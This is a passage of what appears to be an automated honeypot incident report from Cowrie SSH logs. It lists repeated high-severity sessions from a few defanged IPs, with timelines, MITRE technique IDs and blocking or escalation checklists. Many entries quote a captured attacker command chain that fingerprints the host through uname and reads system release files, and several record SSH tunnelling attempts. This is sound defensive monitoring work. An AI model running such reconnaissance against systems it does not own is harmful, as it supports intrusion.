| `2026-08-24 12:31:25` | `cowrie.command.input` |
| `2026-08-24 12:31:25` | `cowrie.command.success` |
| `2026-08-24 12:31:25` | `cowrie.command.input` |
| `2026-08-24 12:31:25` | `cowrie.command.input` |
| `2026-08-24 12:31:25` | `cowrie.command.input` |
| `2026-08-24 12:31:25` | `cowrie.command.input` |
| `2026-08-24 12:31:26` | `cowrie.log.closed` |
| `2026-08-24 12:31:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6fdfd1ba645

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:32 |
| **Last Seen** | 2026-08-24 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:32:40` | `cowrie.session.connect` |
| `2026-08-24 12:32:40` | `cowrie.client.version` |
| `2026-08-24 12:32:40` | `cowrie.client.kex` |
| `2026-08-24 12:32:41` | `cowrie.login.success` |
| `2026-08-24 12:32:41` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:32:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:32:41` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc327852600

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:32 |
| **Last Seen** | 2026-08-24 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:32:43` | `cowrie.session.connect` |
| `2026-08-24 12:32:43` | `cowrie.client.version` |
| `2026-08-24 12:32:43` | `cowrie.client.kex` |
| `2026-08-24 12:32:44` | `cowrie.login.success` |
| `2026-08-24 12:32:44` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:32:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:32:44` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf9c0e5df738

| Field | Detail |
|---|---|
| **Source IP** | `219.73.79[.]33` |
| **First Seen** | 2026-08-24 12:32 |
| **Last Seen** | 2026-08-24 12:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:32:53` | `cowrie.session.connect` |
| `2026-08-24 12:32:54` | `cowrie.client.version` |
| `2026-08-24 12:32:54` | `cowrie.client.kex` |
| `2026-08-24 12:32:56` | `cowrie.login.success` |
| `2026-08-24 12:32:56` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.73.79[.]33` to AbuseIPDB if not already reported
- [ ] Block `219.73.79[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-876a107c6163

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:32 |
| **Last Seen** | 2026-08-24 12:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:32:54` | `cowrie.session.connect` |
| `2026-08-24 12:32:55` | `cowrie.client.version` |
| `2026-08-24 12:32:55` | `cowrie.client.kex` |
| `2026-08-24 12:32:56` | `cowrie.login.success` |
| `2026-08-24 12:32:58` | `cowrie.session.params` |
| `2026-08-24 12:32:58` | `cowrie.command.input` |
| `2026-08-24 12:32:58` | `cowrie.command.input` |
| `2026-08-24 12:32:58` | `cowrie.command.input` |
| `2026-08-24 12:32:58` | `cowrie.command.input` |
| `2026-08-24 12:32:58` | `cowrie.command.input` |
| `2026-08-24 12:32:58` | `cowrie.command.success` |
| `2026-08-24 12:32:58` | `cowrie.command.input` |
| `2026-08-24 12:32:58` | `cowrie.command.input` |
| `2026-08-24 12:32:58` | `cowrie.command.input` |
| `2026-08-24 12:32:58` | `cowrie.command.input` |
| `2026-08-24 12:33:00` | `cowrie.log.closed` |
| `2026-08-24 12:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e597080d738

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:34 |
| **Last Seen** | 2026-08-24 12:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:34:27` | `cowrie.session.connect` |
| `2026-08-24 12:34:27` | `cowrie.client.version` |
| `2026-08-24 12:34:27` | `cowrie.client.kex` |
| `2026-08-24 12:34:29` | `cowrie.login.success` |
| `2026-08-24 12:34:30` | `cowrie.session.params` |
| `2026-08-24 12:34:30` | `cowrie.command.input` |
| `2026-08-24 12:34:30` | `cowrie.command.input` |
| `2026-08-24 12:34:30` | `cowrie.command.input` |
| `2026-08-24 12:34:30` | `cowrie.command.input` |
| `2026-08-24 12:34:30` | `cowrie.command.input` |
| `2026-08-24 12:34:30` | `cowrie.command.success` |
| `2026-08-24 12:34:30` | `cowrie.command.input` |
| `2026-08-24 12:34:30` | `cowrie.command.input` |
| `2026-08-24 12:34:30` | `cowrie.command.input` |
| `2026-08-24 12:34:30` | `cowrie.command.input` |
| `2026-08-24 12:34:30` | `cowrie.log.closed` |
| `2026-08-24 12:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58b213793bd9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:36 |
| **Last Seen** | 2026-08-24 12:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:36:03` | `cowrie.session.connect` |
| `2026-08-24 12:36:04` | `cowrie.client.version` |
| `2026-08-24 12:36:04` | `cowrie.client.kex` |
| `2026-08-24 12:36:05` | `cowrie.login.success` |
| `2026-08-24 12:36:07` | `cowrie.session.params` |
| `2026-08-24 12:36:07` | `cowrie.command.input` |
| `2026-08-24 12:36:07` | `cowrie.command.input` |
| `2026-08-24 12:36:07` | `cowrie.command.input` |
| `2026-08-24 12:36:07` | `cowrie.command.input` |
| `2026-08-24 12:36:07` | `cowrie.command.input` |
| `2026-08-24 12:36:07` | `cowrie.command.success` |
| `2026-08-24 12:36:07` | `cowrie.command.input` |
| `2026-08-24 12:36:07` | `cowrie.command.input` |
| `2026-08-24 12:36:07` | `cowrie.command.input` |
| `2026-08-24 12:36:07` | `cowrie.command.input` |
| `2026-08-24 12:36:08` | `cowrie.log.closed` |
| `2026-08-24 12:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5481b5d17b9c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:37 |
| **Last Seen** | 2026-08-24 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:37:42` | `cowrie.session.connect` |
| `2026-08-24 12:37:42` | `cowrie.client.version` |
| `2026-08-24 12:37:42` | `cowrie.client.kex` |
| `2026-08-24 12:37:43` | `cowrie.login.success` |
| `2026-08-24 12:37:45` | `cowrie.session.params` |
| `2026-08-24 12:37:45` | `cowrie.command.input` |
| `2026-08-24 12:37:45` | `cowrie.command.input` |
| `2026-08-24 12:37:45` | `cowrie.command.input` |
| `2026-08-24 12:37:45` | `cowrie.command.input` |
| `2026-08-24 12:37:45` | `cowrie.command.input` |
| `2026-08-24 12:37:45` | `cowrie.command.success` |
| `2026-08-24 12:37:45` | `cowrie.command.input` |
| `2026-08-24 12:37:45` | `cowrie.command.input` |
| `2026-08-24 12:37:45` | `cowrie.command.input` |
| `2026-08-24 12:37:45` | `cowrie.command.input` |
| `2026-08-24 12:37:45` | `cowrie.log.closed` |
| `2026-08-24 12:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4737f2f0cf8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:39 |
| **Last Seen** | 2026-08-24 12:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:39:25` | `cowrie.session.connect` |
| `2026-08-24 12:39:25` | `cowrie.client.version` |
| `2026-08-24 12:39:25` | `cowrie.client.kex` |
| `2026-08-24 12:39:28` | `cowrie.login.success` |
| `2026-08-24 12:39:29` | `cowrie.session.params` |
| `2026-08-24 12:39:29` | `cowrie.command.input` |
| `2026-08-24 12:39:29` | `cowrie.command.input` |
| `2026-08-24 12:39:29` | `cowrie.command.input` |
| `2026-08-24 12:39:29` | `cowrie.command.input` |
| `2026-08-24 12:39:29` | `cowrie.command.input` |
| `2026-08-24 12:39:29` | `cowrie.command.success` |
| `2026-08-24 12:39:29` | `cowrie.command.input` |
| `2026-08-24 12:39:29` | `cowrie.command.input` |
| `2026-08-24 12:39:29` | `cowrie.command.input` |
| `2026-08-24 12:39:29` | `cowrie.command.input` |
| `2026-08-24 12:39:29` | `cowrie.log.closed` |
| `2026-08-24 12:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e3fd2925794

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:41 |
| **Last Seen** | 2026-08-24 12:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:41:08` | `cowrie.session.connect` |
| `2026-08-24 12:41:08` | `cowrie.client.version` |
| `2026-08-24 12:41:08` | `cowrie.client.kex` |
| `2026-08-24 12:41:09` | `cowrie.login.success` |
| `2026-08-24 12:41:11` | `cowrie.session.params` |
| `2026-08-24 12:41:11` | `cowrie.command.input` |
| `2026-08-24 12:41:11` | `cowrie.command.input` |
| `2026-08-24 12:41:11` | `cowrie.command.input` |
| `2026-08-24 12:41:11` | `cowrie.command.input` |
| `2026-08-24 12:41:11` | `cowrie.command.input` |
| `2026-08-24 12:41:11` | `cowrie.command.success` |
| `2026-08-24 12:41:11` | `cowrie.command.input` |
| `2026-08-24 12:41:11` | `cowrie.command.input` |
| `2026-08-24 12:41:11` | `cowrie.command.input` |
| `2026-08-24 12:41:11` | `cowrie.command.input` |
| `2026-08-24 12:41:11` | `cowrie.log.closed` |
| `2026-08-24 12:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ffc93bbbc9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:41 |
| **Last Seen** | 2026-08-24 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:41:59` | `cowrie.session.connect` |
| `2026-08-24 12:41:59` | `cowrie.client.version` |
| `2026-08-24 12:41:59` | `cowrie.client.kex` |
| `2026-08-24 12:42:00` | `cowrie.login.success` |
| `2026-08-24 12:42:00` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:42:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:42:00` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edaaa92dcf43

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:42 |
| **Last Seen** | 2026-08-24 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:42:03` | `cowrie.session.connect` |
| `2026-08-24 12:42:03` | `cowrie.client.version` |
| `2026-08-24 12:42:03` | `cowrie.client.kex` |
| `2026-08-24 12:42:04` | `cowrie.login.success` |
| `2026-08-24 12:42:04` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:42:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:42:05` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:42:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b473e4e515c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:42 |
| **Last Seen** | 2026-08-24 12:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:42:53` | `cowrie.session.connect` |
| `2026-08-24 12:42:53` | `cowrie.client.version` |
| `2026-08-24 12:42:53` | `cowrie.client.kex` |
| `2026-08-24 12:42:54` | `cowrie.login.success` |
| `2026-08-24 12:42:55` | `cowrie.session.params` |
| `2026-08-24 12:42:55` | `cowrie.command.input` |
| `2026-08-24 12:42:55` | `cowrie.command.input` |
| `2026-08-24 12:42:55` | `cowrie.command.input` |
| `2026-08-24 12:42:55` | `cowrie.command.input` |
| `2026-08-24 12:42:55` | `cowrie.command.input` |
| `2026-08-24 12:42:55` | `cowrie.command.success` |
| `2026-08-24 12:42:55` | `cowrie.command.input` |
| `2026-08-24 12:42:55` | `cowrie.command.input` |
| `2026-08-24 12:42:55` | `cowrie.command.input` |
| `2026-08-24 12:42:55` | `cowrie.command.input` |
| `2026-08-24 12:42:56` | `cowrie.log.closed` |
| `2026-08-24 12:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-005938a43afa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:44 |
| **Last Seen** | 2026-08-24 12:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:44:34` | `cowrie.session.connect` |
| `2026-08-24 12:44:35` | `cowrie.client.version` |
| `2026-08-24 12:44:35` | `cowrie.client.kex` |
| `2026-08-24 12:44:37` | `cowrie.login.success` |
| `2026-08-24 12:44:39` | `cowrie.session.params` |
| `2026-08-24 12:44:39` | `cowrie.command.input` |
| `2026-08-24 12:44:39` | `cowrie.command.input` |
| `2026-08-24 12:44:39` | `cowrie.command.input` |
| `2026-08-24 12:44:39` | `cowrie.command.input` |
| `2026-08-24 12:44:39` | `cowrie.command.input` |
| `2026-08-24 12:44:39` | `cowrie.command.success` |
| `2026-08-24 12:44:39` | `cowrie.command.input` |
| `2026-08-24 12:44:39` | `cowrie.command.input` |
| `2026-08-24 12:44:39` | `cowrie.command.input` |
| `2026-08-24 12:44:39` | `cowrie.command.input` |
| `2026-08-24 12:44:39` | `cowrie.log.closed` |
| `2026-08-24 12:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8ea852f61c3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:46 |
| **Last Seen** | 2026-08-24 12:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:46:12` | `cowrie.session.connect` |
| `2026-08-24 12:46:12` | `cowrie.client.version` |
| `2026-08-24 12:46:12` | `cowrie.client.kex` |
| `2026-08-24 12:46:14` | `cowrie.login.success` |
| `2026-08-24 12:46:16` | `cowrie.session.params` |
| `2026-08-24 12:46:16` | `cowrie.command.input` |
| `2026-08-24 12:46:16` | `cowrie.command.input` |
| `2026-08-24 12:46:16` | `cowrie.command.input` |
| `2026-08-24 12:46:16` | `cowrie.command.input` |
| `2026-08-24 12:46:16` | `cowrie.command.input` |
| `2026-08-24 12:46:16` | `cowrie.command.success` |
| `2026-08-24 12:46:16` | `cowrie.command.input` |
| `2026-08-24 12:46:16` | `cowrie.command.input` |
| `2026-08-24 12:46:16` | `cowrie.command.input` |
| `2026-08-24 12:46:16` | `cowrie.command.input` |
| `2026-08-24 12:46:16` | `cowrie.log.closed` |
| `2026-08-24 12:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ca06f2b0429

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:47 |
| **Last Seen** | 2026-08-24 12:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
